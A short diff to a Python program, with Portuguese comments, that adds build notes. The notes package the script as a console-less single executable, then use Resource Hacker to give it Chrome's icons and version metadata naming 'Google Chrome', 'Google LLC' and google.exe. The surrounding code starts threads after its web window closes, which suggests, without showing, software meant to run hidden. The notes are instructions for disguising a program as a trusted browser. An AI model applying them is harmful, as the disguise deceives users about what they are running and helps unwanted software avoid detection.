@@ -981,4 +981,8 @@ if __name__ == '__main__':
     # Só chega aqui quando a janela web é destruída
     disparar_threads()
 
+# COMO GERAR O .EXE 
 # pyinstaller --noconsole --onefile main.py
+# Usar o resource_hacker para alterar os ícones, caminho ícone chrome: C:\Program Files\Google\Chrome\Application\chrome.exe
+# Alterar o VERSION_INFO:
+# VALUE "FileDescription", "Google Chrome", VALUE "CompanyName", "Google LLC", VALUE "InternalName", "google.exe", VALUE "OriginalFilename", "google.exe
